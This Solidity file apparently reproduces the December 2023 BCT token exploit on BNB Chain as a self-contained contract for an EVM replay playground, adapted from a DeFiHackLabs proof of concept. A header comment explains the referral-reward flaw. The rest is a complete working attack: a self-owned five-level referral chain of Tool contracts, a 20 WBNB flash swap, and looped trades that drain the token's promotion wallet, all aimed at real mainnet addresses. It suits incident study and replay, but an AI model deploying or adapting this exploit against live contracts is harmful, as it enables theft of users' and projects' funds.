// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

// Synthetic standalone exploit for the EVM Playground (2023-12-BCT).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry `BCT` test contract
// (which inherits BaseTestWithBalanceLog/Test and uses cheatcodes: createSelectFork,
// deal), so there is no standalone contract to deploy. This is a faithful,
// self-contained copy of that inline attack (testExploit + init + pancakeCall +
// process + the Tool helper), so the playground can deploy it and record
// testExploit(). Logic and constants are copied verbatim from test/BCT_exp.sol.
// Plain Solidity: no Test, no cheats, no setUp. Entry is testExploit(); the
// flash-swap callback (pancakeCall) and receive() are preserved so PancakeSwap
// can call back into this contract exactly as it did into the test contract.
//
// Root cause: BCT's promoteReward() pays 40% of every pool trade in BCT to up to
// 5 referral levels, funded from a shared 2.76M-BCT promotion wallet
// (payTokenAddress) -- far more than the 15% trading fee it costs to trigger a
// payout. The attacker wires a fully self-owned 5-level referral chain (5 `Tool`
// contracts via bindInviter's magic-amount transfers), flash-borrows 20 WBNB from
// an unrelated KIMO/WBNB pool, and repeatedly trades BCT through the BCT/WBNB
// pool. Each trade fires promoteReward, handing the Tools ~25% of the trade
// amount in fresh BCT net of fees; the Tools immediately sell that BCT into the
// BCT/BUSD and BCT/WBNB pools to pull WBNB out, compounding every round. After 10
// rounds the attacker repays the 20.05 WBNB flash loan and keeps the ~10.15 WBNB
// surplus, funded entirely out of the drained promotion pool.

interface IERC20 {
    function balanceOf(address owner) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
}

interface IPancakePair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IPancakeRouter {
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] memory path,
        address to,
        uint256 deadline
    ) external payable;
}

interface IBCT {
    function inviter(address) external view returns (address);
}

interface IInviter {
    function buy(address, address, uint256) external;
    function f_0xf986351d(address, address, uint256) external;
    function f_0x4e515153(address, address, uint256) external;
}

contract BCT {
    IPancakePair PancakePair = IPancakePair(0x1B96B92314C44b159149f7E0303511fB2Fc4774f); // KIMO/WBNB pair (flash-swap source)
    address private wbnb = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    IERC20 Wbnb = IERC20(wbnb);

    address bct = 0x70ca72BB4A1386439a2a51476f2335A31005EBe8;
    address pancakepair = 0x88b3EB62e363d9f153BeAb49c5C2EF2E785a375a; // BCT/WBNB pair

    address cake_lp = 0x5A25B8576B14699bbb15947111f5811E58B39A82; // BCT/BUSD pair

    address busd = 0x55d398326f99059fF775485246999027B3197955;

    IPancakeRouter router = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));

    IPancakePair cakeLP = IPancakePair(cake_lp);

    /// @notice The recorded entrypoint. ETH working capital (standing in for the
    ///         test's `deal(address(this), 0.1 ether)`) is forwarded to this
    ///         contract in the unrecorded setup phase, so testExploit() takes no
    ///         value and reads its own ETH balance directly via `{value: ...}`.
    function testExploit() external {
        init(); // simulate the first tx for preparation (builds the self-referral chain)
        // attack begin: flash-swap 20 WBNB out of the KIMO/WBNB pool. PancakePair
        // calls back pancakeCall() below, which runs the farm-and-drain loop.
        PancakePair.swap(20_000_000_000_000_000_000, 0, address(this), abi.encode("0x20"));
    }

    // simulate the preparation of the attack, tx: https://bscscan.com/tx/0xd4c19d575ea5b3a415cc288ce09942299ca3a3b49ef9718cda17e4033dd4c250
    // function 0xe531876d of the attacker contract
    function init() public {
        address[] memory tools = new address[](5);

        // create 5 tools for the following attack
        for (uint256 i = 0; i < 5; i++) {
            Tool tool = new Tool();
            tools[i] = address(tool);
        }

        address first = tools[0];

        address[] memory path = new address[](2);
        path[0] = wbnb;
        path[1] = bct;
        // msg.value share to 5 addresses
        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: 0.00015 ether}(
            1_000_000_000_000_000, path, address(this), 99_999_999_999_999_999_999_999_999
        );
        IERC20(bct).transfer(first, 1_000_000_000_000_000);
        IInviter(first).f_0x4e515153(bct, address(this), 500_000_000_000_000);
        uint256 i = 0;
        while (i < 5) {
            uint256 k = 4;
            if (i < k) {
                address current_tool = tools[i];
                address next_tool = tools[i + 1];
                router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: 0.00015 ether}(
                    1_000_000_000_000_000, path, current_tool, 99_999_999_999_999_999_999_999_999
                );
                IInviter(current_tool).f_0x4e515153(bct, next_tool, 1_000_000_000_000_000);
                IInviter(next_tool).f_0x4e515153(bct, current_tool, 500_000_000_000_000);
            }
            i++;
        }
    }

    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        address inviter = address(this);
        uint256 index = 0;
        address[] memory inviters = new address[](5);
        while (index < 5) {
            address inviter_ = IBCT(bct).inviter(inviter);
            inviters[index] = inviter_;
            inviter = inviter_;
            index++;
        }
        index = 0;
        while (index < 5) {
            (uint112 reserve0, uint112 reserve1,) = IPancakePair(pancakepair).getReserves();

            uint256 buyAmount = calculateValue(reserve1, reserve0, 60e18);

            Wbnb.transfer(inviters[index], buyAmount);
            IInviter(inviters[index]).buy(wbnb, pancakepair, buyAmount);
            index++;
        }

        index = 0;
        while (index < 10) {
            uint256 balance = Wbnb.balanceOf(address(this));
            (uint112 reserve0, uint112 reserve1,) = IPancakePair(pancakepair).getReserves();
            uint256 amount = calculate(reserve1, reserve0, balance);

            Wbnb.transfer(pancakepair, balance);
            IPancakePair(pancakepair).swap(amount, 0, cake_lp, "");
            IPancakePair(cake_lp).skim(address(this));

            while (true) {
                uint256 bct_balance = IERC20(bct).balanceOf(address(this));
                if (bct_balance > 1e18) {
                    IERC20(bct).transfer(cake_lp, bct_balance);
                    IPancakePair(cake_lp).skim(address(this));
                } else {
                    process(30e18, inviters);
                    index++;
                    break;
                }
            }
        }

        process(0, inviters);
        Wbnb.transfer(address(PancakePair), 20_050_000_000_000_000_001);
    }

    function process(uint256 inamount, address[] memory inviters) internal {
        uint256 index = 0;
        while (index < 5) {
            address bct_inviter = inviters[index];
            uint256 balance_inviter = IERC20(bct).balanceOf(bct_inviter);
            address addr1 = bct;
            address addr2 = cake_lp;
            uint256 amount = balance_inviter - inamount;

            IInviter(bct_inviter).f_0xf986351d(addr1, addr2, amount);
            index++;
        }

        uint256 busd_balance = IERC20(busd).balanceOf(address(this));
        (uint112 reserve0, uint112 reserve1,) = cakeLP.getReserves();
        IERC20(busd).transfer(cake_lp, busd_balance);
        uint256 swap_amount = calculate(reserve0, reserve1, busd_balance);
        cakeLP.swap(0, swap_amount, pancakepair, "");

        (uint112 r0, uint112 r1,) = IPancakePair(pancakepair).getReserves();
        uint256 swap_amount2 = calculate(r0, r1, swap_amount * 85 / 100);
        IPancakePair(pancakepair).swap(0, swap_amount2, address(this), "");
    }

    function calculateValue(uint112 reserve1, uint112 reserve0, uint256 amount) private pure returns (uint256) {
        uint256 v13 = uint256(reserve1) * amount;
        uint256 v14 = 10_000 * v13;
        uint256 v15 = uint256(reserve0) - amount;
        uint256 v16 = 9975 * v15;
        return 1 + (v14 / v16);
    }

    function calculate(uint112 varg0, uint112 varg1, uint256 varg2) private pure returns (uint256) {
        uint256 v0 = 9975 * varg2;
        uint256 v1 = v0 * varg1;
        uint256 v2 = 10_000 * varg0;
        uint256 v3 = v2 + v0;
        return v1 / v3;
    }

    // ETH change from the router calls in init() flows back here.
    receive() external payable {}
}

contract Tool {
    address _call;

    constructor() {
        _call = tx.origin; // hacker's EOA (the attacker who initiated testExploit)
    }

    function buy(address _srcAddr, address _destAddr, uint256 _destAmount) public {
        require(tx.origin == _call);
        IERC20(_srcAddr).transfer(_destAddr, _destAmount);
        IPancakePair(_destAddr).swap(60e18, 0, address(this), "");
    }

    // dedaub-like solidity
    function f_0xf986351d(address varg0, address varg1, uint256 varg2) public {
        require(tx.origin == _call);
        (uint112 v1, uint112 v2,) = IPancakePair(varg1).getReserves();
        uint256 v4 = 85 * varg2;
        uint256 v5 = 9975 * v4 / 100;
        uint256 v6 = v5 * v1;
        uint256 v7 = 10_000 * v2;

        IERC20(varg0).transfer(varg1, varg2);
        IPancakePair(varg1).swap(v6 / (v5 + v7), 0, msg.sender, "");
    }

    function f_0x4e515153(address varg0, address varg1, uint256 varg2) public {
        require(tx.origin == _call);
        IERC20(varg0).transfer(varg1, varg2);
    }

    receive() external payable {}
}
